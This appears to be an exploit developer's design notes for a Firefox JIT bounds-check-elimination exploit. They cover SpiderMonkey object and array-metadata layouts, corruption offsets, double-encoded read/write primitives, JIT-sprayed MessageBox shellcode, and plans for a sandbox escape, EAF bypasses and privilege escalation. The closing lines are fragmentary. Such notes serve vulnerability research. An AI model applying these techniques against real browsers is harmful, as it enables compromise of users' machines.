Overview

These three arrays wiil appear in memory sequentially in the order they are declared within the same Nursery Chunk

struct NativeObject {
    void *GroupPtr;
    void *ShapePtr;
    void *SlotsPtr;
    void *ElementsPtr; // This does NOT point to the element metadata, it points OVER it to the actual element data itself.
}

typedef struct _ELEMENTS_METADATA {
    uint32_t Flags;
    uint32_t InitializedLength; // The number of elements actually initialized (will be 0 when Array first declared). If you do Array(50) then set index 20 to something, the length will become 20 (and 0-19 will be allocated but marked uninitialized).
    uint32_t Capacity; // Storage allocated for the array
    uint32_t Length; // The literal .length property. Thus Array(50) even though it has an initialized length and capavity of 0 would have a length of 50.
    // ...
} ELEMENTS_METADATA;

After garbage coillection, these appear as:

There are several key indexes which line up with this layout in memory:
1. Corruption of Array 2 metadata is done with indexes 10 and 11 of Array 1 (offsets 0x50 and 0x58 from Array 1 element data): 0x000000000B5BF180 - 000000000B5BF130
2. The slot pointer of the Array 3 native object is accessed with index 8 of Array 2 (offset 0x40 from Array 2 element data): 000000000B5BF1D0 - 000000000B5BF190

The heavy dependence on double floating points in this exploit causes a variety of issues to be considered.
Primarily, that certain values (particularly those with certain of their most significant 64 bits set)
cannot be treated as doubles by JS. This leads to many limitations:
1. The shellcode being JIT sprayed must be able to be 100% encoded as valid doubles. It may need to be
   modified (such as inserting NOPs at key offsets) to accomodate this reality.
2. The initial read primitive (memory leaking doubles) cannot leak 8 byte chunks of memory which cannot
   be interpreted as doubles. In certain cases, JS may even interpret them as tagged pointers, causing
   them to be dereferenced and crashing the process.
3. Both the read/write primitives cannot target addresses which cannot be stored as doubles since these
   addresses themselves must be stored and set as doubles in this source code. Similarly the value itself
   being written in the write primitive must be able to be encoded as a valid double otherwise it could
   not be passed as a double param to the arbitrary write function.
   
The R/W quirks in this exploit lead to some interesting issues and workarounds. Certain types of objects
in JS will be stored on the heap (which is only using 32-bits of the 64 bit address space and is thus
always interpreted as a valid double) while others (such as JIT'd code) will be stored in newly allocated
+RX virtual memory, which is going to use all 64-bits of its address space. This means that objects
stored on the stack/heap are going to generally be fair game, while JIT'd/non-heap regions will be off
limits to the initial R/W primitives.

Design

?

Payload

Presently the payload is a 64-bit MessageBox shellcode which will JIT sprayed as part of a series of floats
within an ordinary JS function (each line fo which containing a reference to atleast one 8 byte chunk of the
shellcode. Note that unlike other exploits such as my previous re-creation of CVE-2020-0674, there is a
dramatic reduction in complexity when it comes to shellcode execution and stealth in the context of a JIT
exploit. There is no need for a ROP chain to bypass DEP, as the JIT sprayed shellcode will already exist
within +RX regions of JIT memory. This means that there is also no need to concern oneself with exploit
mitigation features such as StackPivot protection, CallerCheck, SimExec etc. as these are ROP-oriented
mitigations. 

The shellcode source code itself can be found here: https://github.com/forrest-orr/ExploitDev/blob/master/Shellcode/Projects/MessageBox/Original/MessageBox64.asm

Notably, the task of converting a shellcode into an array of valid double floats can be quite tedious. Many
8 bytes sequences in the shellcode will not be considered to be valid doubles and thus cannot be properly encoded.
My solution to this was to identify the offsets in the shellcode which had double encoding issues and pad them
with NOP instructions until eventually the entire shellcode could be encoded as a single array of double floating
point values inn JS.

Despite these many benefits (as compared to exploits which require ROP chains and CFG bypass), the shellcode
in this exploit does still have one weakness which is EAF (it is resolving its API addresses via the Kernel32.dll
and NTDLL.DLL Export Address Tables. This may be an issue against EMET and its successor Windows Defender Exploit
Guard unless steps are taken to circumvent API resolution via exports, and rather to resolve them through via
imports itstead. 

Future improvements

1. WPAD sandbox escape via RPC chained with CVE-2020-0674
2. EAF/EAF+ bypasses for shellcode
3. Escalation to SYSTEM from LOCAL SERVICE via print spooler vulnerability and impersonation
4. Full attack chain working on Windows 8.1

Quirks

JIT compilation of memory layout post-heap-groom for the primary glitched JS function with the boundscheck
elimination is ineffective on Firefox 70 and 71 despite having only been patched after these releases. It does work
reliably on Firefox 65.

The concept here is that the mutable array slots pointer (in its native object struct) is
going to be pointing at an array of 3 property values (for x, y and z). Since we are trying
to leak the object address (which will be written into the property array slots for x, y or z)
as a double, we may fail to leak its address if this address cannot be represented as a valid
double. Thus the trick is to set the slots pointer in the mutable array native object ahead by
4 bytes. This the result that the object address (previously only in the "y" slot) can now be
partially read (32-bits at a time) from both "x" and "y" and that these values are now certain to
be valid doubles.

We can ensure the resulting double is valid by using bitwise AND to filter off the significant bits
responsible for differentiating between a valid and non-valid double.

These primitives solve the issue of attempting to read 8 bytes in memory which may be invalid

The solution is to simply create a double float array, and then overwrite its data pointer

ambiguity on the part of the JS engine. Since the JS engine knows that the value at this
